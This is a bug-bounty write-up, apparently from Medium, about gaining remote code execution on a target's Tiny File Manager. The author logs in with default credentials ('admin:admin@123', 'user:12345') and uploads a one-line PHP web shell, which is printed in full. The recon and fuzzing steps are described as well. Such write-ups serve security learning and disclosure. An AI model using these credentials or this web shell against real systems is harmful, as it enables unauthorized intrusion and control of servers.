---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-06_story-of-my-first-rce-.md
original_filename: 2023-07-06_story-of-my-first-rce-.md
title: Story Of My First RCE :)
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: e81559cdcb534c715d15247befc9ca34cffd14559515baf819c3206bc0a1700b
text_sha256: 9909e69bb392e6f98577ba279f2d46c061095c717893f3d3fe3b688c7bdcedab
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Story Of My First RCE :)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-06_story-of-my-first-rce-.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `e81559cdcb534c715d15247befc9ca34cffd14559515baf819c3206bc0a1700b`
- Text SHA256: `9909e69bb392e6f98577ba279f2d46c061095c717893f3d3fe3b688c7bdcedab`


## Content

---
title: "Story Of My First RCE :)"
url: "https://medium.com/@0utlawh4ck3r/story-of-my-first-rce-9d74373fbc11"
authors: ["0utlawh4ck3r (@outlawh4ck3r)"]
bugs: ["RCE", "Default credentials"]
publication_date: "2023-07-06"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 963
scraped_via: "browseros"
---

# Story Of My First RCE :)

Story Of My First RCE :)
0utlawh4ck3r
Follow
3 min read
·
Jul 6, 2023

54

2

Hello Guys , I hope you are well 🍻

My name is Hossein And This Is my First Writeup .

Lets Call Program : target.com

When I was looking for a good program , find This Wide Program :))

The program said that all my assets were in scope, so I started to

Wide recon :

My Recon Flow :

1 - Use Google Dork To Find Organization name 
2 - Use Whois Providers To Find Domain with Organization Name 
3 - Use bgp.he.net & bgpview.io To Discover ASNs
4 - Use Certificate Search 

After I did all this, I found almost 30,000 domains, 99% of which belonged to that company. So Started Hunting

Hunt :

Used HTTPx & Dnsx For Resolving domains .

Httpx command :

httpx -title -sc -cl -asn -td -o httpx.out

After Httpx command , filter Result to Just Show Me Domains Used PHP :))

Because I Love Hunt On Legacy WebApps.

Get 0utlawh4ck3r’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now I Have 300 Domain Used PHP Tech , randomly opened a domain and main page like this :

Press enter or click to view image in full size

Start Fuzzing On Target With Dirsearch :

Press enter or click to view image in full size
This Is Not Full Result , Because I took this photo after reporting and many of those files were deleted

There is a page named admin , when i open this redirect me to main page .

Again I used dirsearch tool to find some interesting directory 🙃

I Found directory named : tinyfilemanager.php :

Press enter or click to view image in full size

I had never seen this before and I started searching about this CMS .

I Found This Article About Exploit Some Web CMS and etc.

It was written in this article that you can login with this user and password by default :

admin:admin@123

  OR

user:12345

When I used these user passwords, I logged in very strangely 😅 I couldn’t believe that I was finally able to take the first RCE.

I was able to upload my shell using this PHP code :

<?php

  $cmd = $_GET["cmd"];
  echo system($cmd);

?>
Press enter or click to view image in full size

Boom My Command Run💥

Thank you very much for taking the time to read this writeup

This is my Twitter account, thank you for following me and if you have any questions, be sure to ask 🌹🍻 (I apologize for my bad English)
Twitter
